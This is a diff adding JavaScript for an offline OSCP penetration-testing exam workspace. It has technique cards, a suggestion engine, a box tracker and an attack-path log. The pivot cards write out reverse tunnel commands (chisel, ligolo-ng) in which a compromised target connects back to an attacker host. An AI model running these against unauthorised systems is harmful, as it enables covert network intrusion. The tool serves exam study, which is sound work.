+    {cmd:"ssh -D 1080 user@<pivot>   # then set socks5 127.0.0.1 1080 in proxychains.conf", note:"Dynamic SOCKS for whole subnets."},
+    {cmd:"proxychains nmap -sT -Pn <internal-IP>", note:"Tunnel tools through the proxy."}],
+  look:["Internal hosts only the pivot can see","127.0.0.1-bound services from privesc enum","Dual-homed pivot box"],
+  triggers:{ports:[],os:"any",needsShell:true,type:"any"} },
+{ id:"piv-chisel", phase:"pivot", service:"pivot", title:"chisel tunnel (no SSH)",
+  summary:"When SSH isn't available — HTTP-based SOCKS tunnel.",
+  commands:[
+    {cmd:"./chisel server -p 8000 --reverse   # on attacker", note:"Listen."},
+    {cmd:"./chisel client <attacker>:8000 R:1080:socks   # on target", note:"Reverse SOCKS back to you."},
+    {cmd:"proxychains <tool> <internal-IP>", note:"Route through 127.0.0.1:1080."}],
+  look:["Outbound HTTP allowed from target","Windows or Linux target (chisel is cross-platform)","Need full subnet access"],
+  triggers:{ports:[],os:"any",needsShell:true,type:"any"} },
+{ id:"piv-ligolo", phase:"pivot", service:"pivot", title:"ligolo-ng (clean tunnel)",
+  summary:"Userland TUN interface — feels like a route to the subnet.",
+  commands:[
+    {cmd:"sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up", note:"Set up the interface (attacker)."},
+    {cmd:"./proxy -selfcert   # attacker listener", note:"Start the proxy."},
+    {cmd:"./agent -connect <attacker>:11601 -ignore-cert   # target", note:"Agent connects back."},
+    {cmd:"# in proxy: session, then add a route to the internal subnet", note:"Then use tools natively, no proxychains."}],
+  look:["Need to reach a whole internal /24","Tools that dislike proxychains","Stable long-lived pivot"],
+  triggers:{ports:[],os:"any",needsShell:true,type:"any"} },
+
+/* ---------- META / REFERENCE ---------- */
+{ id:"stuck", phase:"meta", service:"any", title:"Stuck checklist — work the list before you spiral",
+  summary:"Almost every stuck moment is unfinished enumeration.",
+  commands:[
+    {cmd:"nmap -p- --min-rate=2000 <IP>   &&   nmap -sU --top-ports 50 <IP>", note:"Did you REALLY run -p- and UDP?"},
+    {cmd:"feroxbuster -u http://<IP>/ -w <BIGGER-list> -x php,txt,bak ; ffuf vhost", note:"Re-enum web: bigger wordlist + vhosts."},
+    {cmd:"# reuse EVERY cred on EVERY service; searchsploit EVERY version", note:"Password reuse + version mapping."}],
+  look:["Re-read files you skimmed — creds hide there","On this box >90 min? rotate to another, come back fresh","Partial progress = points: document what you have"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+{ id:"rules", phase:"meta", service:"any", title:"Exam rules — what's allowed & what fails you",
+  summary:"Read this when in doubt. Breaking these = instant fail.",
+  commands:[
+    {cmd:"# NO AI/LLM during the exam OR the reporting phase — instant fail", note:"This tool is offline & AI-free by design."},
+    {cmd:"# Metasploit/Meterpreter: ONE machine only, and NOT for pivoting", note:"Choose that box wisely."},
+    {cmd:"# Proof = local.txt/proof.txt + ip a / ipconfig in the SAME screenshot", note:"Log every command for the report."}],
+  look:["Banned: sqlmap, Armitage, AutoSploit, Cobalt Strike, mass scanners (Nessus/OpenVAS/Nexpose), spoofing/poisoning (Responder poison mode)","Allowed: nmap/NSE, nikto, dirb/feroxbuster/gobuster, Burp Community, hydra, hashcat/john, your own scripts","One MSF box; no auto-exploitation; document everything"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+];
+const CARD_BY_ID = {};
+CARDS.forEach(c=>CARD_BY_ID[c.id]=c);
+
+/* ============================================================
+   State
+   ============================================================ */
+const LS_KEY = "oscp_workspace_v1";
+const EXAM_DURATION = 85500000; // 23h45m
+
+let state = null;
+const ui = { centerTab:"arsenal", mobileTab:"center", expanded:new Set(), filterPhase:"all", filterService:"all", filterOS:"all", query:"", lastAddedLog:null };
+
+function uid(){ return Math.random().toString(36).slice(2,9)+(performance.now()|0).toString(36); }
+function nowMs(){ return Date.now(); }
+
+function defaultBox(name){
+  return { id:uid(), name:name||"Target 1", ip:"", os:"unknown", type:"standalone",
+    status:"new", pointsTarget:20, pointsEarned:0, startedAt:nowMs(),
+    facts:{ports:[],creds:[],vhosts:[],loot:[]}, log:[] };
+}
+function freshState(){
+  const b = defaultBox("Target 1");
+  return { exam:{ startedAt:nowMs(), durationMs:EXAM_DURATION, targetPoints:70 }, boxes:[b], activeBoxId:b.id };
+}
+function load(){
+  try{
+    const raw = localStorage.getItem(LS_KEY);
+    if(raw){ const s = JSON.parse(raw); if(s&&s.boxes&&s.boxes.length){ return normalize(s); } }
+  }catch(e){}
+  return freshState();
+}
+function normalize(s){
+  s.exam = s.exam||{}; s.exam.startedAt = s.exam.startedAt||nowMs();
+  s.exam.durationMs = s.exam.durationMs||EXAM_DURATION; s.exam.targetPoints = s.exam.targetPoints||70;
+  s.boxes.forEach(b=>{
+    b.facts = b.facts||{}; b.facts.ports=b.facts.ports||[]; b.facts.creds=b.facts.creds||[];
+    b.facts.vhosts=b.facts.vhosts||[]; b.facts.loot=b.facts.loot||[]; b.log=b.log||[];
+    b.startedAt=b.startedAt||nowMs(); b.pointsTarget=b.pointsTarget||20; b.pointsEarned=b.pointsEarned||0;
+  });
+  if(!s.activeBoxId || !s.boxes.find(b=>b.id===s.activeBoxId)) s.activeBoxId=s.boxes[0].id;
+  return s;
+}
+function save(){ try{ localStorage.setItem(LS_KEY, JSON.stringify(state)); }catch(e){ toast("⚠ Save failed — Backup JSON now"); } }
+function activeBox(){ return state.boxes.find(b=>b.id===state.activeBoxId)||state.boxes[0]; }
+function commit(){ save(); render(); }
+
+/* ============================================================
+   Suggestion engine — deterministic, reads facts/status/log/time
+   ============================================================ */
+function suggestions(box){
+  const out=[]; const seen=new Set();
+  const add=(id,reason)=>{ if(CARD_BY_ID[id]&&!seen.has(id)){ seen.add(id); out.push({id,reason}); } };
+  const ports=box.facts.ports||[]; const has=p=>ports.includes(p);
+  const log=box.log||[];
+  const elapsedMin=(nowMs()-box.startedAt)/60000;
+
+  // stuck detection
+  const failByPhase={};
+  log.forEach(e=>{ if(e.status==="failed") failByPhase[e.phase]=(failByPhase[e.phase]||0)+1; });
+  const manyFails=Object.values(failByPhase).some(n=>n>=5);
+  const stuckTime=elapsedMin>90 && box.status==="new";
+  const stuck = manyFails||stuckTime;
+
+  if(stuck) add("stuck", stuckTime? "90+ min here with no foothold — work the checklist, then rotate boxes." : "5+ dead ends in one phase — step back and run the checklist.");
+
+  if(log.length===0){
+    add("recon-full","No steps logged yet — start with a full TCP port scan.");
+    add("recon-udp","Run a UDP top-ports scan in parallel — easy to forget.");
+  }
+
+  const web = has(80)||has(443)||has(8080)||has(8000)||has(8443);
+  if((has(445)||has(139)) && box.status==="new") add("enum-smb","445/139 open — enumerate SMB (null session, shares).");
+  if(web){ add("enum-http","Web port open — enumerate HTTP first; best foothold odds."); add("web-dirbrute","Directory-brute the web root."); add("web-vhost","Brute vhosts — a hidden site is common."); }
+  if(has(21)) add("enum-ftp","21 open — try anonymous FTP.");
+  if(has(22)) add("enum-ssh","22 open — keep it for any creds you find.");
+  if(has(3306)) add("enum-mysql","3306 open — try MySQL (weak/blank root).");
+  if(has(1433)) add("enum-mssql","1433 open — try MSSQL.");
+  if(has(161)) add("enum-snmp","161/udp — SNMP often leaks creds/processes.");
+  if(has(2049)) add("enum-nfs","2049 — list NFS exports.");
+  if(has(25)) add("enum-smtp","25 — SMTP user enumeration.");
+  if(has(53)) add("enum-dns","53 — attempt a zone transfer.");
+  if(has(389)||has(636)) add("enum-ldap","LDAP open — try an anonymous bind dump.");
+  if(has(5985)||has(5986)) add("enum-winrm","WinRM open — your shell once you have creds.");
+  if(has(3389)) add("enum-rdp","3389 — RDP with any found creds.");
+
+  if((box.facts.creds||[]).length){ add("acc-spray","You captured creds — spray them across every service."); add("acc-crack","Got hashes? crack them offline with hashcat."); }
+
+  if(box.status==="foothold"){
+    add("shell-pty","Stabilise your shell, then grab the foothold proof.");
+    add("shell-proof","Capture local.txt + id/ip a in one screenshot now.");
+    if(box.os==="linux"){ add("pe-lin-sudo","Linux foothold — check sudo -l first."); add("pe-lin-suid","Then hunt SUID binaries."); add("pe-lin-cron","Check cron jobs & writable scripts."); add("pe-lin-enum","Run broad privesc enum (linpeas)."); }
+    else if(box.os==="windows"){ add("pe-win-priv","Windows foothold — whoami /priv (SeImpersonate → Potato)."); add("pe-win-service","Check service misconfigs."); add("pe-win-creds","Hunt stored creds (cmdkey/registry/files)."); add("pe-win-enum","Run broad privesc enum (winpeas)."); }
+    else { add("pe-lin-sudo","Foothold — set this box's OS to get targeted privesc tips."); }
+  }
+  if(box.status==="rooted"){ add("shell-proof","Rooted — confirm proof.txt + ipconfig/ip a captured in one shot."); }
+
+  if(box.type==="ad"){ add("ad-enum","AD box — run assumed-breach enumeration (BloodHound)."); add("ad-kerberoast","Try Kerberoasting for service-account creds."); add("ad-asrep","Try AS-REP roasting (no creds needed)."); }
+
+  if(out.length===0){ add("recon-full","Nothing obvious yet — re-verify your scans are complete."); add("stuck","Feeling stuck? open the checklist."); }
+  return out;
+}
+
+/* ============================================================
+   Rendering
+   ============================================================ */
+const $ = s=>document.querySelector(s);
+function esc(s){ return String(s==null?"":s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }
+function subIP(cmd,box){ return (box&&box.ip)? cmd.replace(/<IP>/g, box.ip) : cmd; }
+
+function fmtClock(ms){
+  if(ms<0) ms=0;
+  const t=Math.floor(ms/1000);
+  const h=String(Math.floor(t/3600)).padStart(2,"0");
+  const m=String(Math.floor((t%3600)/60)).padStart(2,"0");
+  const s=String(t%60).padStart(2,"0");
+  return h+":"+m+":"+s;
+}
+function fmtDur(ms){
+  const t=Math.floor(ms/60000);
+  const h=Math.floor(t/60), m=t%60;
+  return h>0? (h+"h "+m+"m") : (m+"m");
+}
+function fmtTime(ts){ const d=new Date(ts); return String(d.getHours()).padStart(2,"0")+":"+String(d.getMinutes()).padStart(2,"0")+":"+String(d.getSeconds()).padStart(2,"0"); }
+
+function updateClocks(){
+  const rem = state.exam.startedAt + state.exam.durationMs - nowMs();
+  const el = $("#clock"); el.textContent = fmtClock(rem);
+  el.classList.toggle("clock-low", rem < 3600000);
+  // board times tick
+  document.querySelectorAll("[data-boxtime]").forEach(n=>{
+    const b = state.boxes.find(x=>x.id===n.getAttribute("data-boxtime"));
+    if(b) n.textContent = fmtDur(nowMs()-b.startedAt);
+  });
+}
+
+function render(){
+  const box = activeBox();
+  // topbar
+  const totalPts = state.boxes.reduce((a,b)=>a+(+b.pointsEarned||0),0);
+  $("#points").textContent = totalPts+" / "+state.exam.targetPoints;
+  $("#boxName").textContent = box.name;
+  $("#boxIp").textContent = (box.ip||"no IP")+" · "+box.os;
+  updateClocks();
+
+  renderSuggestions(box);
+  renderFilters();
+  renderArsenal(box);
+  renderMap(box);
+  renderRight(box);
+  $("#arsenalCount").textContent = "";
+}
+
+function logBtns(cardId, ctx){
+  return `<button class="btn tiny log-w" data-act="log" data-card="${cardId}" data-status="worked" data-ctx="${ctx}">✓ Worked</button>
+          <button class="btn tiny log-f" data-act="log" data-card="${cardId}" data-status="failed" data-ctx="${ctx}">✕ Failed</button>
+          <button class="btn tiny log-p" data-act="log" data-card="${cardId}" data-status="partial" data-ctx="${ctx}">~ Partial</button>`;
+}
+
+function renderSuggestions(box){
+  const sugg = suggestions(box);
+  let html = `<p class="sec-label">Do this next</p>`;
+  sugg.forEach(s=>{
+    const c = CARD_BY_ID[s.id];
+    const warn = (s.id==="stuck");
+    html += `<div class="sugg ${warn?'warn':''}">
+      <div class="t"><span class="tag phase">${esc(phaseLabel(c.phase))}</span> ${esc(c.title)}</div>
+      <div class="why">${esc(s.reason)}</div>
+      <div class="row">
+        ${logBtns(c.id,"sugg")}
+        <button class="btn tiny ghost" data-act="open-card" data-card="${c.id}">Open ↗</button>
+      </div>
+    </div>`;
+  });
+
+  // board
+  html += `<p class="sec-label">Boxes · ${state.boxes.length}</p>`;
+  state.boxes.forEach(b=>{
+    html += `<button class="board-item ${b.id===state.activeBoxId?'active':''}" data-act="activate" data-box="${b.id}">
+      <span class="pill ${b.status}"><span class="dot"></span>${esc(b.status)}</span>
+      <span class="meta">
+        <span class="nm">${esc(b.name)}</span>
+        <span class="ln"><span class="mono">${esc(b.ip||"no IP")}</span><span>${esc(b.os)}</span><span data-boxtime="${b.id}">${fmtDur(nowMs()-b.startedAt)}</span></span>
+      </span>
+      <span class="board-pts">${(+b.pointsEarned||0)}<span style="color:var(--text-3)">/${b.pointsTarget}</span></span>
+    </button>`;
+  });
+  html += `<div class="row" style="display:flex;gap:6px;margin-top:8px">
+    <button class="btn sm" data-act="new-box" style="flex:1">+ New box</button>
+    <button class="btn sm" data-act="edit-box">Edit</button>
+  </div>`;
+  $("#suggBody").innerHTML = html;
+}
+
+function renderFilters(){
+  const phases=[...new Set(CARDS.map(c=>c.phase))];
+  const services=[...new Set(CARDS.map(c=>c.service))];
+  const oses=["any","linux","windows"];
+  const chip=(val,active,act)=>`<button class="chip" data-act="${act}" data-val="${val}" aria-pressed="${active}">${esc(val==="all"?"All":(act==='fp'?phaseLabel(val):val))}</button>`;
+  let h="";
+  h+=`<div class="filt-row"><span class="lab">Phase</span>${chip("all",ui.filterPhase==="all","fp")}${phases.map(p=>chip(p,ui.filterPhase===p,"fp")).join("")}</div>`;
+  h+=`<div class="filt-row"><span class="lab">Service</span>${chip("all",ui.filterService==="all","fs")}${services.map(s=>chip(s,ui.filterService===s,"fs")).join("")}</div>`;
+  h+=`<div class="filt-row"><span class="lab">OS</span>${chip("all",ui.filterOS==="all","fo")}${oses.map(o=>chip(o,ui.filterOS===o,"fo")).join("")}</div>`;
+  $("#filters").innerHTML=h;
+}
+
+function cardMatches(c){
+  if(ui.filterPhase!=="all" && c.phase!==ui.filterPhase) return false;
+  if(ui.filterService!=="all" && c.service!==ui.filterService) return false;
+  if(ui.filterOS!=="all" && c.triggers.os!=="any" && c.triggers.os!==ui.filterOS) return false;
+  if(ui.query){
+    const q=ui.query.toLowerCase();
+    const hay=(c.title+" "+c.summary+" "+c.look.join(" ")+" "+c.commands.map(x=>x.cmd).join(" ")).toLowerCase();
+    if(!hay.includes(q)) return false;
+  }
+  return true;
+}
+
+function renderArsenal(box){
+  const list = CARDS.filter(cardMatches);
+  $("#arsenalCount").textContent = list.length+" / "+CARDS.length;
+  if(!list.length){ $("#arsenalBody").innerHTML=`<div class="empty">No techniques match. Clear filters or search.</div>`; return; }
+  let html="";
+  list.forEach(c=>{
+    const open=ui.expanded.has(c.id);
+    html+=`<div class="card ${open?'open':''}" id="card-${c.id}">
+      <div class="card-head" data-act="toggle" data-card="${c.id}">
+        <div class="body">
+          <div class="title">${esc(c.title)}</div>
+          <div class="summary">${esc(c.summary)}</div>
+          <div class="card-tags">
+            <span class="tag phase">${esc(phaseLabel(c.phase))}</span>
+            <span class="tag">${esc(c.service)}</span>
+            ${c.triggers.os!=="any"?`<span class="tag">${esc(c.triggers.os)}</span>`:""}
+            ${c.triggers.needsShell?`<span class="tag">needs shell</span>`:""}
+            ${c.triggers.type==="ad"?`<span class="tag">AD</span>`:""}
+          </div>
+        </div>
+        <span class="chev">▸</span>
+      </div>`;
+    if(open){
+      html+=`<div class="card-detail">
+        <div class="dh">Commands — click to copy</div>`;
+      c.commands.forEach((cm,i)=>{
+        html+=`<div class="cmd" data-act="copy" data-card="${c.id}" data-i="${i}">
+          <div class="ct"><code>${esc(subIP(cm.cmd,box))}</code>${cm.note?`<div class="note">${esc(cm.note)}</div>`:""}</div>
+          <span class="copy">⧉ copy</span>
+        </div>`;
+      });
+      html+=`<div class="dh">What to look for</div><ul class="look">${c.look.map(l=>`<li>${esc(l)}</li>`).join("")}</ul>`;
+      html+=`<div class="logbar">
+        <input class="note-in" type="text" placeholder="Optional note…" data-note="${c.id}">
+        ${logBtns(c.id,"card")}
+      </div></div>`;
+    }
+    html+=`</div>`;
+  });
+  $("#arsenalBody").innerHTML=html;
+}
+
+function stageOfEntry(e){ return phaseStage(e.phase); }
+
+function renderMap(box){
+  const good = box.log.filter(e=>e.status==="worked"||e.status==="partial").slice().reverse(); // chronological
+  const bad = box.log.filter(e=>e.status==="failed").slice().reverse();
+  let html=`<div class="map-wrap">`;
+  if(!good.length){
+    html+=`<div class="empty">No successful steps yet.<br>Log a <b>Worked</b> or <b>Partial</b> step and your attack path appears here — your "how did I get root" answer.</div>`;
+  }else{
+    // group by stage but keep chronological order within
+    STAGE_ORDER.forEach(stage=>{
+      const items = good.filter(e=>stageOfEntry(e)===stage);
+      if(!items.length) return;
+      html+=`<div class="lane"><div class="lane-h"><span class="ln-dot"></span>${esc(STAGE_LABEL[stage])}</div>`;
+      items.forEach((e,idx)=>{
+        html+=`<div class="node ${e.status==='partial'?'partial':''}">
+          <div class="nt">${esc(phaseLabel(e.phase))}: ${esc(e.title)}${e.status==='partial'?' <span class="tag" style="color:var(--partial)">partial</span>':''}</div>
+          ${e.command?`<div class="nc">${esc(e.command)}</div>`:""}
+          ${e.note?`<div class="nc" style="color:var(--text-2)">↳ ${esc(e.note)}</div>`:""}
+        </div>`;
+        if(idx<items.length-1) html+=flowArrow();
+      });
+      html+=`</div>`;
+      // arrow between lanes (visual continuity) handled by spacing
+    });
+    if(box.status==="rooted") html+=`<div class="root-node">🏁 ROOT — proof.txt captured?</div>`;
+  }
+  if(bad.length){
+    html+=`<details class="graveyard"><summary>Graveyard — ${bad.length} dead end${bad.length>1?'s':''}</summary><ul>`;
+    bad.forEach(e=>{ html+=`<li>${esc(phaseLabel(e.phase))}: ${esc(e.title)}${e.note?` — ${esc(e.note)}`:""}${e.command?`<div class="gc">${esc(e.command)}</div>`:""}</li>`; });
+    html+=`</ul></details>`;
+  }
+  html+=`</div>`;
+  $("#mapBody").innerHTML=html;
+}
+function flowArrow(){ return `<div class="flowline"><svg width="14" height="20" viewBox="0 0 14 20"><line x1="7" y1="0" x2="7" y2="14" stroke="currentColor" stroke-width="2"/><path d="M3 12 L7 18 L11 12" fill="none" stroke="currentColor" stroke-width="2"/></svg></div>`; }
+
+function renderRight(box){
+  let html="";
+  // box facts editor mini
+  html+=`<div class="cap">
+    <h3>This box</h3>
+    <div class="frm">
+      <label style="flex:1 1 100%;display:flex;flex-direction:column;gap:3px;font-size:11px;color:var(--text-3);font-weight:700">STATUS
+        <select data-act="set-status" style="padding:6px 9px;border:1px solid var(--border-strong);border-radius:6px;background:var(--surface-2);color:var(--text);font-weight:400">
+          ${["new","foothold","rooted","abandoned"].map(s=>`<option value="${s}" ${box.status===s?"selected":""}>${s}</option>`).join("")}
+        </select>
+      </label>
+    </div>
+  </div>`;
+
+  // quick capture
+  html+=`<div class="cap">
+    <h3>Quick capture → facts</h3>
+    <form class="frm" data-act="add-port"><input type="text" name="port" placeholder="ports e.g. 80,443,445" inputmode="numeric"><button class="btn sm accent" type="submit">Add ports</button></form>
+    <div class="fact-grp"><div class="gl">Ports</div><div class="facts">${box.facts.ports.length? box.facts.ports.map(p=>`<span class="fact mono">${esc(p)}<span class="x" data-act="rm-port" data-val="${p}">×</span></span>`).join(""):`<span style="color:var(--text-3);font-size:12px">none yet</span>`}</div></div>
+
+    <form class="frm" data-act="add-cred" style="margin-top:12px">
+      <input class="short" type="text" name="user" placeholder="user">
+      <input class="short" type="text" name="pass" placeholder="pass">
+      <input class="short" type="text" name="hash" placeholder="hash">
+      <input class="short" type="text" name="source" placeholder="source (where found)">
+      <button class="btn sm accent" type="submit">Add cred</button>
+    </form>
+    <div class="fact-grp"><div class="gl">Creds</div><div class="facts">${box.facts.creds.length? box.facts.creds.map((c,i)=>`<span class="fact mono">${esc(c.user||"?")}:${esc(c.pass||c.hash||"?")}${c.source?` <span style="color:var(--text-3)">(${esc(c.source)})</span>`:""}<span class="x" data-act="rm-cred" data-val="${i}">×</span></span>`).join(""):`<span style="color:var(--text-3);font-size:12px">none yet</span>`}</div></div>
+
+    <form class="frm" data-act="add-vhost" style="margin-top:12px"><input type="text" name="vhost" placeholder="vhost / hostname"><button class="btn sm" type="submit">Add vhost</button></form>
+    <div class="fact-grp"><div class="gl">Vhosts</div><div class="facts">${box.facts.vhosts.length? box.facts.vhosts.map((v,i)=>`<span class="fact mono">${esc(v)}<span class="x" data-act="rm-vhost" data-val="${i}">×</span></span>`).join(""):`<span style="color:var(--text-3);font-size:12px">none yet</span>`}</div></div>
+
+    <form class="frm" data-act="add-loot" style="margin-top:12px"><input type="text" name="loot" placeholder="loot / interesting find"><button class="btn sm" type="submit">Add loot</button></form>
+    <div class="fact-grp"><div class="gl">Loot</div><div class="facts">${box.facts.loot.length? box.facts.loot.map((v,i)=>`<span class="fact">${esc(v)}<span class="x" data-act="rm-loot" data-val="${i}">×</span></span>`).join(""):`<span style="color:var(--text-3);font-size:12px">none yet</span>`}</div></div>
+  </div>`;
+
+  // live log
+  html+=`<p class="sec-label">What worked / failed / partial · ${box.log.length}</p>`;
+  if(!box.log.length){
+    html+=`<div class="empty">Nothing logged.<br>Use the <b>Worked / Failed / Partial</b> buttons on any technique to build your log + report.</div>`;
+  }else{
+    box.log.forEach(e=>{
+      const flash = (e.id===ui.lastAddedLog)?" flash":"";
+      html+=`<div class="entry ${e.status}${flash}">
+        <div class="top">
+          <span class="ttl">${esc(e.title)}</span>
+          <span class="ts">${fmtTime(e.ts)}</span>
+        </div>
+        <div style="margin-top:3px"><span class="pill ${e.status}"><span class="dot"></span>${e.status}</span> <span class="tag phase">${esc(phaseLabel(e.phase))}</span></div>
+        ${e.command?`<div class="cmd-line" data-act="copy-text" data-text="${esc(e.command)}">${esc(e.command)}</div>`:""}
+        <input class="note-edit" type="text" placeholder="add a note for the report…" value="${esc(e.note||"")}" data-act="edit-note" data-id="${e.id}">
+        <div class="erow">
+          <label class="proof-tog ${e.proof?'on':''}"><input type="checkbox" data-act="toggle-proof" data-id="${e.id}" ${e.proof?"checked":""}> proof captured</label>
+          <span class="del" data-act="del-entry" data-id="${e.id}">delete</span>
+        </div>
+      </div>`;
+    });
+  }
+  $("#rightBody").innerHTML=html;
+  ui.lastAddedLog=null;
+}
+
+/* ============================================================
+   Actions
+   ============================================================ */
+function addLog(cardId, status, note){
+  const box=activeBox(); const c=CARD_BY_ID[cardId];
+  const cmd = c.commands.length? subIP(c.commands[0].cmd, box) : "";
+  const entry={ id:uid(), boxId:box.id, ts:nowMs(), title:c.title, command:cmd, status, phase:c.phase, note:note||"", proof:false };
+  box.log.unshift(entry);
+  ui.lastAddedLog=entry.id;
+  // gentle auto-status nudge
+  if(status==="worked"){
+    if(/foothold|access|web|enum/.test(c.phase) && box.status==="new") box.status="foothold";
+  }
+  commit();
+  toast(status==="worked"?"Logged ✓ Worked":status==="failed"?"Logged ✕ Failed":"Logged ~ Partial");
+}
+
+document.addEventListener("click", e=>{
+  const t = e.target.closest("[data-act]");
+  if(!t) return;
+  const act=t.getAttribute("data-act");
+  const box=activeBox();
+
+  if(act==="toggle"){ const id=t.getAttribute("data-card"); if(ui.expanded.has(id)) ui.expanded.delete(id); else ui.expanded.add(id); renderArsenal(box); return; }
+  if(act==="copy"){ const c=CARD_BY_ID[t.getAttribute("data-card")]; const i=+t.getAttribute("data-i"); copyText(subIP(c.commands[i].cmd,box)); return; }
+  if(act==="copy-text"){ copyText(t.getAttribute("data-text")); return; }
+  if(act==="log"){
+    const id=t.getAttribute("data-card"); const status=t.getAttribute("data-status");
+    let note="";
+    if(t.getAttribute("data-ctx")==="card"){ const ni=document.querySelector(`input[data-note="${id}"]`); if(ni) note=ni.value.trim(); }
+    addLog(id,status,note); return;
+  }
+  if(act==="open-card"){
+    const id=t.getAttribute("data-card");
+    ui.centerTab="arsenal"; ui.expanded.add(id); setCenterTab("arsenal");
+    if(window.matchMedia("(max-width:1080px)").matches) setMobileTab("center");
+    render();
+    const el=document.getElementById("card-"+id); if(el) el.scrollIntoView({behavior:"smooth",block:"center"});
+    return;
+  }
+  if(act==="activate"){ state.activeBoxId=t.getAttribute("data-box"); ui.expanded.clear(); commit(); if(window.matchMedia("(max-width:1080px)").matches) setMobileTab("center"); return; }
+  if(act==="new-box"){ openBoxModal(null); return; }
+  if(act==="edit-box"){ openBoxModal(box); return; }
+
+  // fact removals
+  if(act==="rm-port"){ const v=+t.getAttribute("data-val"); box.facts.ports=box.facts.ports.filter(p=>p!==v); commit(); return; }
+  if(act==="rm-cred"){ box.facts.creds.splice(+t.getAttribute("data-val"),1); commit(); return; }
+  if(act==="rm-vhost"){ box.facts.vhosts.splice(+t.getAttribute("data-val"),1); commit(); return; }
+  if(act==="rm-loot"){ box.facts.loot.splice(+t.getAttribute("data-val"),1); commit(); return; }
+
+  if(act==="toggle-proof"){ const en=box.log.find(x=>x.id===t.getAttribute("data-id")); if(en){ en.proof=!en.proof; commit(); } return; }
+  if(act==="del-entry"){ if(confirm("Delete this log entry?")){ box.log=box.log.filter(x=>x.id!==t.getAttribute("data-id")); commit(); } return; }
+});
+
+// forms (quick capture)
+document.addEventListener("submit", e=>{
+  const f=e.target.closest("form[data-act]"); if(!f) return;
+  e.preventDefault();
+  const act=f.getAttribute("data-act"); const box=activeBox();
+  if(act==="add-port"){
+    const raw=f.port.value; const nums=raw.split(/[,\s]+/).map(x=>parseInt(x,10)).filter(x=>x>0&&x<65536);
+    nums.forEach(n=>{ if(!box.facts.ports.includes(n)) box.facts.ports.push(n); });
+    box.facts.ports.sort((a,b)=>a-b); f.reset(); commit();
+  }else if(act==="add-cred"){
+    const c={user:f.user.value.trim(),pass:f.pass.value.trim(),hash:f.hash.value.trim(),source:f.source.value.trim(),worksOn:""};
+    if(c.user||c.pass||c.hash){ box.facts.creds.push(c); f.reset(); commit(); }
+  }else if(act==="add-vhost"){ const v=f.vhost.value.trim(); if(v){ box.facts.vhosts.push(v); f.reset(); commit(); } }
+  else if(act==="add-loot"){ const v=f.loot.value.trim(); if(v){ box.facts.loot.push(v); f.reset(); commit(); } }
+});
+
+// change events (status select, note edit)
+document.addEventListener("change", e=>{
+  const t=e.target.closest("[data-act]"); if(!t) return;
+  const act=t.getAttribute("data-act"); const box=activeBox();
+  if(act==="set-status"){ box.status=t.value; commit(); }
+});
+document.addEventListener("input", e=>{
+  const t=e.target;
+  if(t.getAttribute && t.getAttribute("data-act")==="edit-note"){
+    const en=activeBox().log.find(x=>x.id===t.getAttribute("data-id")); if(en){ en.note=t.value; save(); }
+  }
+});
+
+/* center tabs */
+function setCenterTab(tab){
+  ui.centerTab=tab;
+  document.querySelectorAll(".center-tab").forEach(b=>b.setAttribute("aria-selected", b.getAttribute("data-ctab")===tab));
+  $("#arsenalBarWrap").style.display = tab==="arsenal"?"":"none";
+  $("#arsenalBody").style.display = tab==="arsenal"?"":"none";
+  $("#mapBody").style.display = tab==="map"?"":"none";
+}
+document.querySelectorAll(".center-tab").forEach(b=>b.addEventListener("click",()=>setCenterTab(b.getAttribute("data-ctab"))));
+
+/* mobile tabs */
+function setMobileTab(tab){
+  ui.mobileTab=tab;
+  document.querySelectorAll(".tabbar button").forEach(b=>b.setAttribute("aria-selected", b.getAttribute("data-tab")===tab));
+  document.querySelectorAll(".col").forEach(c=>c.classList.toggle("shown", c.getAttribute("data-col")===tab));
+}
+document.querySelectorAll(".tabbar button").forEach(b=>b.addEventListener("click",()=>setMobileTab(b.getAttribute("data-tab"))));
+
+/* filter chips */
+document.addEventListener("click", e=>{
+  const c=e.target.closest(".chip[data-act]"); if(!c) return;
+  const act=c.getAttribute("data-act"), val=c.getAttribute("data-val");
+  if(act==="fp") ui.filterPhase=val; else if(act==="fs") ui.filterService=val; else if(act==="fo") ui.filterOS=val; else return;
+  renderFilters(); renderArsenal(activeBox());
+});
+
+/* search */
+$("#search").addEventListener("input", e=>{ ui.query=e.target.value.trim(); renderArsenal(activeBox()); });
+
+/* ============================================================
+   Clipboard / toast
+   ============================================================ */
+function copyText(text){
+  const ok=()=>toast("Copied to clipboard");
+  const fb=()=>{ try{ const ta=document.createElement("textarea"); ta.value=text; ta.style.position="fixed"; ta.style.opacity="0"; document.body.appendChild(ta); ta.focus(); ta.select(); document.execCommand("copy"); ta.remove(); ok(); }catch(e){ toast("Copy failed — select manually"); } };
+  if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(text).then(ok).catch(fb); } else fb();
+}
+let toastT=null;
+function toast(msg){
+  const wrap=$("#toasts"); wrap.innerHTML=`<div class="toast">${esc(msg)}</div>`;
+  clearTimeout(toastT); toastT=setTimeout(()=>{ wrap.innerHTML=""; }, 1900);
+}
+
+/* ============================================================
+   Modals
+   ============================================================ */
+function openModal(title, bodyHTML, onMount){
+  closeModal();
+  const scrim=document.createElement("div"); scrim.className="scrim"; scrim.id="scrim";
+  scrim.innerHTML=`<div class="modal" role="dialog" aria-modal="true" aria-label="${esc(title)}">
+    <div class="modal-h"><h2>${esc(title)}</h2><button class="btn ghost sm" data-close>✕ Close</button></div>
+    <div class="modal-b">${bodyHTML}</div></div>`;
+  document.body.appendChild(scrim);
+  scrim.addEventListener("click", ev=>{ if(ev.target===scrim||ev.target.closest("[data-close]")) closeModal(); });
+  if(onMount) onMount(scrim);
+}
+function closeModal(){ const s=$("#scrim"); if(s) s.remove(); }
+
+function openCardModal(id){
+  const c=CARD_BY_ID[id]; const box=activeBox();
+  let b=`<p style="color:var(--text-2);margin-top:0">${esc(c.summary)}</p><h3>Commands</h3>`;
+  c.commands.forEach((cm,i)=>{ b+=`<div class="cmd" data-act="copy" data-card="${id}" data-i="${i}"><div class="ct"><code>${esc(subIP(cm.cmd,box))}</code>${cm.note?`<div class="note">${esc(cm.note)}</div>`:""}</div><span class="copy">⧉ copy</span></div>`; });
